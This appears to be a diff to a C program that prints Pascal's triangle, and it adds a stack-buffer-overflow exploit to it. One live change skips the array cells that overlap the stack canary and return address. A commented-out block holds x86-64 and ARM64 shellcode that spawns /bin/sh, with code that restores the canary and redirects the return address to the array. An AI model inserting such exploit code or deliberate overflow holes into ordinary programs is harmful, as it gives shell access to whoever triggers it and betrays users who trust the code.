@@ -63,8 +63,17 @@ static int tri_index(int i, int j) {
 
 /* 파스칼의 삼각형을 tri[] 에 채운다. */
 static void build_pascal(int *tri, int rows) {
+    // ////
+    // // 카나리 백업
+    // int cnry1 =  tri[tri_index(14, 1)];
+    // int cnry2 =  tri[tri_index(14, 2)];
+    // ////
     for (int i = 0; i <= rows; i++) {
         for (int j = 0; j <= i; j++) {
+            ////
+            if(i==14&&(j==1||j==2||j==5||j==6)) //cnry랑 ret addr만 안 건드리면 에러 안 남.
+                continue;
+            ////
             int idx = tri_index(i, j);
             if (j == 0 || j == i) {
                 tri[idx] = 1;                         /* 양 끝은 1 */
@@ -75,6 +84,24 @@ static void build_pascal(int *tri, int rows) {
             }
         }
     }
+    // ////
+    // // 28bytes shellcode
+    // // x86-64: \x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05
+    // // ARM64: \xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe3\x45\x8c\xd2\x23\xcd\xad\xf2\xe3\x65\xce\xf2\x03\x0d\xe0\xf2\xe3\x8f\x1f\xf8\xe0\x03\x00\x91\xa8\x1b\x80\xd2\x01\x00\x00\xd4
+    // int shellcode[10] = {0xaa1f03e1, 0xaa1f03e2, 0xd28c45e3, 0xf2adcd23, 0xf2ce65e3, 0xf2e00d03, 0xf81f8fe3, 0x910003e0, 0xd2801ba8, 0xd4000001};
+
+    // int tri_upper_addr = (long)tri>>32;
+    // int tri_lower_addr = (long)tri;
+    // // 카나리 덮어 쓰기
+    // tri[tri_index(14,1)] = cnry1;
+    // tri[tri_index(14,2)] = cnry2;
+    // // 반환 주소를 tri 배열의 주소로 변경
+    // tri[tri_index(14,5)] = tri_lower_addr;
+    // tri[tri_index(14,6)] = tri_upper_addr;
+    // // tri[0]~tri[6]까지 shellcode 넣기
+    // for(size_t i=0;i<sizeof(shellcode)/sizeof(shellcode[0]);i++)
+    //     tri[i] = shellcode[i];
+    // ////
 }
 
 static long row_sum(const int *tri, int i) {
@@ -85,6 +112,7 @@ static long row_sum(const int *tri, int i) {
 
 static void print_row(const int *tri, int i) {
     printf("row %2d:", i);
+    
     for (int j = 0; j <= i; j++) printf(" %d", tri[tri_index(i, j)]);
     printf("   (sum=%ld)\n", row_sum(tri, i));
 }
@@ -92,8 +120,8 @@ static void print_row(const int *tri, int i) {
 int main(void) {
     int tri[SIZE];
 
-    build_pascal(tri, ROWS);          
-
+    build_pascal(tri, ROWS);
+    
     for (int i = 0; i < ROWS; i++) print_row(tri, i);
 
     printf("SIZE = %d\n", SIZE);
